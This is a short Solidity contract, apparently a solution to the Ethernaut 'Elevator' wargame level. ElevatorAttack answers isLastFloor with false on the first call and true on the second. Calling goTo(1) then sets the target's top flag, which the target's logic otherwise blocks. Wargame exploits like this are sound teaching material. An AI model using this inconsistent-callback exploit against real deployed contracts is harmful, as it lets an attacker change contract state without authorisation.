// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract ElevatorAttack {
    Elevator target;
    bool _isLastFloor;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!_isLastFloor) {
            _isLastFloor = true;
            return false;
        }
        return true;
    }

    function run() public {
        target.goTo(1);
    }
}
